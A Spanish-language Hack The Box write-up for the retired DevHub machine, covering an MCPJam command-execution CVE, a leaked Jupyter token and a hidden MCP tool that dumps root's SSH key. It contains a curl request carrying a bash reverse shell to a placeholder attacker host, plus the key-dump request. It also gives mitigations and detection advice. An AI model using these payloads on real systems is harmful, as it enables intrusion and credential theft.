---
machine: DevHub
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, web, mcp, cve-2026-23744, jupyter, privesc]
---

# DevHub — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

El portal `devhub.htb` anuncia un inspector MCP, Jupyter y un servidor Git. En `6274` corre MCPJam 1.4.2, vulnerable a CVE-2026-23744: `/api/mcp/connect` acepta un comando y lo ejecuta, lo que da una shell como `mcp-dev`. Desde ahí se enumeran dos servicios locales: Jupyter en `8888`, cuyo token aparece en la unidad de systemd y en la línea de procesos, y OPSMCP en `5000`. El token de Jupyter permite entrar como `analyst`; su `.opsmcp_key` autentica contra OPSMCP, que expone una herramienta oculta capaz de volcar la clave SSH de root.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80,6274 <IP>
```

- `22` OpenSSH 8.9p1.
- `80` nginx 1.18.0 con redirección a `devhub.htb`.
- `6274` MCPJam Inspector 1.4.2.

```bash
echo '<IP> devhub.htb' | sudo tee -a /etc/hosts
```

La web es estática y menciona un servicio Jupyter interno en `8888`, un servidor Git y MCP Inspector. El escaneo de directorios no añade nada.

## Enumeración

En `http://devhub.htb:6274/` se confirma la versión `v1.4.2` en Settings. La búsqueda de vulnerabilidades para esa versión lleva a CVE-2026-23744: MCPJam escucha por defecto en `0.0.0.0` y permite que una petición HTTP instale y ejecute un servidor MCP arbitrario.

```bash
curl -s http://devhub.htb:6274/ | head
```

## Foothold

El endpoint vulnerable recibe un `serverConfig` con `command` y `args`:

```bash
curl -k http://devhub.htb:6274/api/mcp/connect \
  -H 'Content-Type: application/json' \
  --data '{
    "serverConfig": {
      "command": "bash",
      "args": ["-c", "bash -i >& /dev/tcp/<ATTACKER>/443 0>&1"],
      "env": {}
    },
    "serverId": "poc"
  }'
```

La petición puede quedarse colgada o devolver `Connection closed`; el comando se ejecuta igualmente y aparece una shell como `mcp-dev`. Para estabilizarla se puede escribir una clave SSH en `~/.ssh/authorized_keys`.

## Movimiento lateral

```bash
netstat -tnlp
```

Dos puertos locales resultan relevantes:

- `127.0.0.1:8888` — Jupyter.
- `127.0.0.1:5000` — OPSMCP.

`/etc/systemd/system/jupyter.service` se ejecuta como `analyst` y contiene el token de Jupyter y el directorio de notebooks. El proceso también muestra el token en su línea de comandos. Se reenvía el puerto:

```bash
ssh -L 8888:localhost:8888 mcp-dev@devhub.htb
```

En Jupyter se abre una terminal y se obtiene una shell como `analyst`. En su home aparece `.opsmcp_key`, y `/opt/opsmcp/server.py` corre como root. El código revela herramientas visibles y dos ocultas: `ops._debug_mode` y `ops._admin_dump`.

## Escalada de privilegios

La clave de `.opsmcp_key` se envía en la cabecera `X-API-Key`. `ops._admin_dump` acepta `target: "ssh_keys"` y cualquier valor truthy en `confirm`:

```bash
KEY=$(cat ~/.opsmcp_key)
curl -s http://127.0.0.1:5000/tools/call \
  -H "X-API-Key: $KEY" \
  -H 'Content-Type: application/json' \
  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":"true"}}'
```

La respuesta incluye la clave privada de root. Se guarda con permisos `600` y se conecta:

```bash
chmod 600 id_rsa_root
ssh -i id_rsa_root root@devhub.htb
```

## Evidencia

- Banner y Settings de MCPJam con la versión 1.4.2.
- Petición a `/api/mcp/connect` y shell como `mcp-dev`.
- `netstat` con `5000` y `8888` en loopback.
- Unidad de systemd y `ps` con el token de Jupyter.
- `.opsmcp_key` y respuesta de `ops._admin_dump` con la clave de root.
- `id` como root por SSH.

## Lecciones aprendidas

- Una herramienta de desarrollo escuchando en `0.0.0.0` puede ser una RCE remota aunque esté pensada para uso local.
- Los tokens de Jupyter aparecen en unidades de systemd y en `ps`; un puerto local no es una frontera de seguridad.
- El código fuente de un servicio interno puede revelar herramientas ocultas que no aparecen en `/tools/list`.
- Una clave de API con privilegios excesivos convierte una función de “recuperación” en una puerta trasera.

## Mitigaciones y detección

- Actualizar MCPJam a 1.4.3 o superior y escuchar solo en `127.0.0.1`.
- No permitir que una API instale o ejecute servidores MCP sin autenticación y allowlist de comandos.
- Sacar tokens de las unidades y de las líneas de proceso; usar ficheros con permisos restringidos.
- Ejecutar Jupyter y OPSMCP con usuarios sin privilegios y separar la clave de recuperación de la API.
- Detectar peticiones a `/api/mcp/connect` con `command`/`args`, procesos hijos inesperados de Node y accesos a `/tools/call` con `ops._admin_dump`.

## Referencias

- [0xdf — DevHub](https://0xdf.gitlab.io/2026/10/10/htb-devhub.html)
- [IppSec — DevHub](https://www.youtube.com/watch?v=XRqQjK345zo)
- [NVD — CVE-2026-23744](https://nvd.nist.gov/vuln/detail/CVE-2026-23744)
- [Hack The Box — DevHub](https://app.hackthebox.com/machines/devhub)
